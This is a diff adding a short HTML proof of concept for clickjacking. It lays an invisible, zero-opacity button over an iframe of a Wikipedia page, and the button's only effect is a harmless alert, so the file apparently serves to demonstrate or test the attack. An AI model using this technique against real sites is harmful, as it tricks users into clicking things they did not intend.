@@ -1,0 +1,52 @@
+﻿<html>
+
+<body>
+<style>
+
+html { -ms-overflow-style: none; 
+overflow: -moz-scrollbars-none; } 
+html::-webkit-scrollbar { display: none; }
+
+iframe {
+  width: 100%;
+  height: 95%;
+  position: absolute;
+  top:0; left:0px;
+}
+
+
+#clickjacking-button {
+  width: 20%;
+  height: 20%;
+  position: absolute;
+  top:0; right:25px;
+  opacity: 0; /* in real opacity:0 */
+  z-index: 1;
+}
+</style>
+
+<input type="button" id="clickjacking-button" onclick="alert('I have did something on your behalf')">
+
+
+<iframe class="your-website-frame" src="https://en.wikipedia.org/wiki/Wikipedia"></iframe>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
